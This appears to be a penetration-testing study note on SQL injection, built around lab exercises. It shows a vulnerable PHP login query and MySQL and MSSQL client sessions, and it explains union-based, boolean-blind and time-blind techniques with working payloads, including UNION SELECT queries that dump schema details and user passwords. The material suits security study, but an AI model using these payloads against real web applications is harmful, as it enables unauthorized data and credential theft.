## SQL Injection Attacks

SQLi vulnerabilities enable attackers to meddle with SQL queries exchanged between the web application and database. SQL vulnerabilities typically allow the attacker to extend the original application query to include database tables that would normally be inaccessible.

We can better understand this concept by examining the  following backend PHP code portion that is responsible for verifying user-submitted credentials during login:
```bash
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```

When testing a web application, we sometimes lack prior knowledge of the underlying database system, so we should be prepared to interact with different SQL database variants. The most common variants are MySQL and Microsoft SQL Server (MSSQL).

**In-band**: You use the same communication channel to both launch an attack and receive feedback from the backend. 
- **Error-based**: Forces the database into generating an error, giving the attacker information upon which to refine the payload.
- **Union**: Leverages the UNION SQL operater to combine the results of two queries into a single result set
**Inferential (Blind)**: You don't receive feedback.
- **Boolean-based**: Uses boolean conditions to return a different result depending on whether the query returns a true or false result
```bash
select title from product where id =1 and 1=2
```
```bash
Payload:
www.random.com/app.php?id=1 and SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's'
```
Check if the first character in the password is an 's' (if nothing is returned on the page it's false). You can iterate through the password. Automate this.
- **Time-based**: Relies on th e database pausting for a specified amount of time before returning the results
**Out-of-band**: Unable to use the same channel as the db; unable to make a connection.

#### MySQL

Using the mysql command, you can connect to the remote SQL instance by specifying root as username and password, along with the default MySQL server port 3306.
```bash
kali@kali:~$ mysql -u root -p'root' -h 192.168.50.16 -P 3306

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```
The root user in this example is the database-specific 
root user, not the the system-wide administrative root user.

Show version and user.
```bash
MySQL [(none)]> select version();
+-----------+
| version() |
+-----------+
| 8.0.21    |
+-----------+
1 row in set (0.107 sec)

MySQL [(none)]> select system_user();
+--------------------+
| system_user()      |
+--------------------+
| root@192.168.20.50 |
+--------------------+
1 row in set (0.104 sec)
```

Collect a list of databases:
```bash
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| test               |
+--------------------+
5 rows in set (0.107 sec)
```

As an example, let's retrieve the password of the offsec user present in the mysql database.
```bash
MySQL [mysql]> SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
+--------+------------------------------------------------------------------------+
| user   | authentication_string                                                  |
+--------+------------------------------------------------------------------------+
| offsec | $A$005$?qvorPp8#lTKH1j54xuw4C5VsXe5IAa1cFUYdQMiBxQVEzZG9XWd/e6|
+--------+------------------------------------------------------------------------+
1 row in set (0.106 sec)
```
To improve its security, the user's password is stored in the authentication_string field as a Caching-SHA-256 algorithm.

#### MSSQL

A built-in command-line tool named SQLCMD allows SQL queries to be run through the Windows command prompt or even remotely from another machine.

Kali Linux includes Impacket, a Python framework that enables network protocol interactions. Among many other protocols, it supports Tabular Data Stream (TDS), the protocol adopted by MSSQL that is implemented in the impacket-mssqlclient tool.

Run **impacket-mssqlclient** to connect to the remote Windows machine running MSSQL by providing a username, a password, and the remote IP, together with the -windows-auth keyword. This forces NTLM authentication (as opposed to Kerberos)
```bash
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL>
```

Every database management system has its own syntax that we should take into consideration when enumerating a target during a penetration test.
```bash
SQL>SELECT @@version;
...

Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
	Sep 24 2019 13:48:23
	Copyright (C) 2019 Microsoft Corporation
	Express Edition (64-bit) on Windows Server 2022 Standard 10.0 <X64> (Build 20348: ) (Hypervisor)
```

When using a SQL Server command line tool like sqlcmd, we must submit our SQL statement ending with a semicolon followed by GO on a separate line. However, when running the command remotely, we can omit the GO statement since it's not part of the MSSQL TDS protocol.

To list all the available databases, we can select all names from the system catalog.
```bash
SELECT name FROM sys.databases;
name
...
master

tempdb

model

msdb

offsec
```

### Union-based Payloads

The UNION keyword aids exploitation because it enables execution of an extra SELECT statement and provides the results in the same query, thus concatenating two queries into one statement.

For UNION SQLi attacks to work, we first need to satisfy two conditions:

    1. The injected UNION query has to include the same number of columns as the original query.
    2. The data types need to be compatible between each column.

To demonstrate this concept, let's test a web application with the following preconfigured SQL query:
```bash
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```
The query fetches all the records from the customers table. It also includes the LIKE keyword to search any name values containing our input that are followed by zero or any number of characters, as specified by the percentage (%) operator.

Before crafting an attack strategy, we need to know the exact number of columns present in the target table. To discover the correct number of columns, we can submit the following injected query into the search bar:
```bash
' ORDER BY 1-- //
```
The above statement orders the results by a specific column, meaning it will fail whenever the selected column does not exist. Increasing the column value by one each time, we'll discover that the table has five columns, since ordering by column six returns an error.

With this information in mind, we can attempt our first attack by enumerating the current database name, user, and MySQL version.
```bash
%' UNION SELECT database(), user(), @@version, null, null -- //
```
Since we want to retrieve all the data from the customers table, we'll use the percentage sign followed by a single quote to close the search parameter. Then, we begin our injected query with a UNION SELECT statement that dumps the current database name, the user, and the MySQL version in the first, second, and third columns, respectively, leaving the remaining two null.

After launching our attack, we'll notice that the username and the DB version are present on the last line, but the current database name is not. This happens because column 1 is typically reserved for the ID field consisting of an integer data type, meaning it cannot return the string value we are requesting through the SELECT database() statement.

With this in mind, let's update our query by shifting all the enumerating functions to the right-most place, avoiding any type mismatches. Since we already verified the expected output, we can omit the percentage sign and rerun our modified query.

```bash
' UNION SELECT null, null, database(), user(), @@version  -- //
```

Let's extend our tradecraft and verify whether other tables are present in the current database. We can start by enumerating the information schema of the current database from the information_schema.columns table.

	INFORMATION_SCHEMA provides access to database metadata, information about the MySQL server such as the name of a database or table, the data type of a column, or access privileges. Other terms that are sometimes used for this information are data dictionary and system catalog. 

```bash
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

Interestingly, we discovered a new table named users that contains four columns, including one named password.

Let's craft a new query to dump the users table.
```bash
' UNION SELECT null, username, password, description, null FROM users -- //
```

### Blink SQL Injections

The SQLi payloads we have encountered are **in-band**, meaning we're able to retrieve the database content of our query inside the web application.

Alternatively, **blind SQL injections** describe scenarios in which database responses are never returned and behavior is inferred using either boolean- or time-based logic.

**Generic boolean-based blind SQL injections** cause the application to return different and predictable values whenever the database query returns a TRUE or FALSE result, hence the "boolean" name. These values can be reviewed within the application context.

**Time-based blind SQL injections** infer the query results by instructing the database to wait for a specified amount of time. Based on the response time, the attacker is able to conclude if the statement is TRUE or FALSE.

To test for boolean-based SQLi, we can try to append the below payload to the URL:
```bash
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```
Since 1=1 will always be TRUE, the application will return the values only if the user is present in the database. Using this syntax, we could enumerate the entire database for other usernames or even extend our SQL query to verify data in other tables.

We can achieve the same result by using a time-based SQLi payload:
```bash
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
In this case, we appended an IF condition that will always be true inside the statement itself, but will return false if the user is non-existent.

This attack angle can clearly become very time consuming, so it's often automated with tools like sqlmap.

**Initially pinpoint the parameter affected by the blind SQL injection through manual examination and only then pass this information to any automated tool such as SQLmap.**